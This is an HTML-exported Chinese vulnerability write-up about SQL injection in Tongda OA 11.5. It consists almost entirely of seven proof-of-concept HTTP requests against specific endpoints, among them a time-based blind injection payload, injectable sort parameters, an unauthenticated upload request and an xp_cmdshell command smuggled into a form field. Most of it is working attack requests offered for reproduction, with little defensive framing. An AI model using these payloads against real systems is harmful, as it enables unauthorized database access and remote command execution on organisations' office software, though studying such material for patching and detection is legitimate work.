<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="通达oa-115-sql注入漏洞"><span class="csECDA2D3">通达</span><span class="csDE05BCC">oa 11.5 sql</span><span class="csECDA2D3">注入漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h3 class="cs868C439D">
			<a name="利用条件"><span class="csD6CA00D2">利用条件：</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">一枚普通账号登录权限，但测试发现，某些低版本也无需登录也可注入。</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">通达</span><span class="cs8926E06">oa 11.5</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="poc-一"><span class="csD1E291E2">poc </span><span class="csD6CA00D2">一</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">POST /general/appbuilder/web/calendar/calendarlist/getcallist HTTP/1.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Referer: https://www.0-sec.org/portal/home/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Cookie: PHPSESSID=54j5v894kbrm5sitdvv8nk4520; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c9e143ff</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Connection: keep-alive</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: www.0-sec.org</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Pragma: no-cache</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">X-Requested-With: XMLHttpRequest</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Length: 154</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">X-WVS-ID: Acunetix-Autologin/65535</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Cache-Control: no-cache</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept: */*</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Origin: https://www.0-sec.org</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Language: en-US,en;q=0.9</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">starttime=AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])---&amp;endtime=1598918400&amp;view=month&amp;condition=1</span></p><h3 class="cs868C439D">
			<a name="poc-二"><span class="csD1E291E2">poc </span><span class="csD6CA00D2">二</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">GET /general/email/sentbox/get_index_data.php?asc=0&amp;boxid=&amp;boxname=sentbox&amp;curnum=3&amp;emailtype=ALLMAIL&amp;keyword=sample%40email.tst&amp;orderby=1&amp;pagelimit=20&amp;tag=&amp;timestamp=1598069133&amp;total= HTTP/1.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">X-Requested-With: XMLHttpRequest</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Referer: https://www.0-sec.org/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Cookie: PHPSESSID=54j5v894kbrm5sitdvv8nk4520; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c9e143ff</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Encoding: gzip,deflate</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: www.0-sec.org</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Connection: close</span></p><h3 class="cs868C439D">
			<a name="poc-三"><span class="csD1E291E2">poc </span><span class="csD6CA00D2">三</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">GET /general/email/inbox/get_index_data.php?asc=0&amp;boxid=&amp;boxname=inbox&amp;curnum=0&amp;emailtype=ALLMAIL&amp;keyword=&amp;orderby=3--&amp;pagelimit=10&amp;tag=&amp;timestamp=1598069103&amp;total= HTTP/1.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">X-Requested-With: XMLHttpRequest</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Referer: https://www.0-sec.org</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Cookie: PHPSESSID=54j5v894kbrm5sitdvv8nk4520; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c9e143ff</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Encoding: gzip,deflate</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: www.0-sec.org</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Connection: close</span></p><h3 class="cs868C439D">
			<a name="poc-四"><span class="csD1E291E2">poc </span><span class="csD6CA00D2">四</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">GET /general/appbuilder/web/report/repdetail/edit?link_type=false&amp;slot={}&amp;id=2 HTTP/1.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">X-Requested-With: XMLHttpRequest</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Referer: https://www.0-sec.org</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Cookie: PHPSESSID=54j5v894kbrm5sitdvv8nk4520; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c9e143ff</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Encoding: gzip,deflate</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: www.0-sec.org</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Connection: close</span></p><h3 class="cs868C439D">
			<a name="poc-五"><span class="csD1E291E2">poc </span><span class="csD6CA00D2">五</span></a></h3>
		<p class="cs6FD73CFB"><span class="cs9C1B1871">无需登陆</span></p><p class="cs3A447A38"><span class="cs9FB05234">POST /general/file_folder/swfupload_new.php HTTP/1.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Referer: http://192.168.202.1/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Connection: close</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: 192.168.202.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Length: 391</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Language: en-US</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Type: multipart/form-data; boundary=----------GFioQpMK0vv2</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">------------GFioQpMK0vv2</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Disposition: form-data; name=&quot;ATTACHMENT_ID&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">------------GFioQpMK0vv2</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Disposition: form-data; name=&quot;ATTACHMENT_NAME&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">------------GFioQpMK0vv2</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Disposition: form-data; name=&quot;FILE_SORT&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">2</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">------------GFioQpMK0vv2</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Disposition: form-data; name=&quot;SORT_ID&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">------------GFioQpMK0vv2--</span></p><h3 class="cs868C439D">
			<a name="poc-六"><span class="csD1E291E2">poc </span><span class="csD6CA00D2">六</span></a></h3>
		<p class="cs6FD73CFB"><span class="cs9C1B1871">会过滤掉：空格、制表符、换行符、回车符、垂直制表符等。只能报错，或尝试</span><span class="cs8926E06"> and </span><span class="cs9C1B1871">等语句判断还是没有问题的。</span></p><p class="cs3A447A38"><span class="cs9FB05234">POST /general/file_folder/api.php HTTP/1.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Referer: http://192.168.202.1/general/file_folder/public_folder.php?FILE_SORT=1&amp;SORT_ID=59</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">X-Resource-Type: xhr</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Cookie: PHPSESSID=g1njm64pl94eietps80muet5d7; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=fab32701</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Connection: close</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: 192.168.202.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Pragma: no-cache</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">x-requested-with: XMLHttpRequest</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Length: 82</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">x-wvs-id: Acunetix-Deepscan/209</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Cache-Control: no-cache</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">accept: */*</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">origin: http://192.168.202.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Language: en-US</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">content-type: application/x-www-form-urlencoded; charset=UTF-8</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">CONTENT_ID_STR=222&amp;SORT_ID=59&amp;FILE_SORT=1&amp;action=sign</span></p><h3 class="cs868C439D">
			<a name="poc-七"><span class="csD1E291E2">poc </span><span class="csD6CA00D2">七</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">POST /general/appbuilder/web/meeting/meetingmanagement/meetingreceipt HTTP/1.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Referer: http://192.168.202.1/general/meeting/myapply/details.php?affair=true&amp;id=5&amp;nosign=true&amp;reminding=true</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">X-Resource-Type: xhr</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Cookie: PHPSESSID=g1njm64pl94eietps80muet5d7; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=fab32701</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Connection: close</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: 192.168.202.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Pragma: no-cache</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">x-requested-with: XMLHttpRequest</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Length: 97</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">x-wvs-id: Acunetix-Deepscan/186</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Cache-Control: no-cache</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">accept: */*</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">origin: http://192.168.202.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Language: en-US</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">content-type: application/x-www-form-urlencoded; charset=UTF-8</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">m_id=5&amp;join_flag=2&amp;remark=&#39;%3b%20exec%20master%2e%2exp_cmdshell%20&#39;ping%20172%2e10%2e1%2e255&#39;--</span></p></body>
</html>
